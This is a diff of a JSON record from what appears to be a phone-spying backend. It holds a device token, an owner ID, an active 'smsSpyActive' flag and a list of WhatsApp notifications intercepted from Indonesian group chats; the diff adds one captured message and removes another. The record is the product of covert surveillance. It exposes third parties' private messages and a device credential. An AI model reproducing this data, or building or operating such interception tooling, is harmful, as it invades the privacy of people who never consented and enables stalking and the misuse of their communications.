@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777175348186,
+    "lastSeen": 1777175351424,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Pegasus-X Room (19 pesan): ~ Riski",
+        "content": "KUMPULAN SC WHATSAPP FREE\n      \nLINK SALUREN\nhttps://whatsapp.com/channel/0029VbCkgmt2f3EQmrLlZB29\n\nNOTE : JANGAN LUPA JOIN YA UNTUK INFORMASI SC WHATSAPP FREE",
+        "time": "26/04 12:00",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777175351777
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd (64 pesan): 📣 Menyebut Anda",
@@ -4011,14 +4019,6 @@
         "time": "26/04 11:22",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173077081
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎[𝐃𝐖𝐁] 𝐃𝐀𝐄𝐑𝐀𝐇 𝐖𝐎𝐍𝐆 𝐁𝐀𝐂𝐎𝐓 || 𝐍𝐄𝐖 𝐄𝐑𝐀 (94 pesan): ~ ken y.",
-        "content": "[26/04, 10:09] ken y.: katanya susu coklat dari sapi yang warna coklat, brrti kalo strawbery dari sapi yang warna pink ya?\n[26/04, 10:10] ken y.: berarti kalo susu melon, sapinya ijo",
-        "time": "26/04 11:22",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173077077
       }
     ],
     "galleryPhotos": [],
